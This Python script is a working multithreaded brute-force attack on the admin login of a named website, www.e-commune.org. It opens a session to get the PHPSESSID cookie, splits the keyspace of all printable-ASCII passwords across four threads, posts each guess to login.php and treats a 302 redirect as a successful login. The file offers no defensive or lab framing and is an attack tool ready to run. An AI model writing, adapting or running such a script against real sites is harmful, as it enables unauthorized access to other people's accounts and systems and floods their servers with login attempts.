import requests
import threading

run = True

def init_session() ->requests.Session :
    '''
    Create a Web session on the client and setting a cookie for the session id "PHPSESSID" and return the session object
    '''
    session=requests.session()
    res=session.get(url='http://www.e-commune.org/')
    cookie=res.headers['Set-Cookie'].split('=',1)
    session.cookies.set(cookie[0], cookie[1], domain='www.e-commune.org', path='/')
    return session


def check_password(session : requests.Session, password : str) -> bool:
    '''
    Checks if the creds are correct
    '''
    data={'login':'admin', 'pass':password}
    url='http://www.e-commune.org/login.php'
    res=session.post(url, data=data, allow_redirects=False)
    return res.status_code==302
    


def bruteforce(s : requests.Session, thread_id : int , num_threads : int) -> str:
    '''
    bruteforce the creds with a dynamic length with all printable ascii characters for a defined interval
    and return the password
    '''
    global run

    charset = ''.join(chr(i) for i in range(32, 127))  # ASCII from space to ~ [32 .. 127]  ## in case of testing set interval of chars between [a..o] 97 .. 112
    base = len(charset)
    length=1    

    while True:  
        elem = (base ** length) // num_threads 
        if base ** length % num_threads : elem+=1      
        for num in range( thread_id*elem, min((thread_id+1)*elem, base ** length) ):
            if run :
                password = ""
                for _ in range(length):
                    num, remainder = divmod(num, base)
                    password = charset[remainder] + password
                print(password)
                if(check_password(s,password)) :
                    run = False
                    return password
            else :
                return  None
        length+=1


def task(thread_id : int, num_threads : int) -> None:
    '''
    defined task for each thread
    '''
    session = init_session()
    password=bruteforce(session, thread_id, num_threads)
    if password :
        print("password is : " + password)


if __name__ == "__main__":
    num_threads = 4
    for i in range(num_threads):
        t = threading.Thread(target=task, args=(i,num_threads,))
        t.start()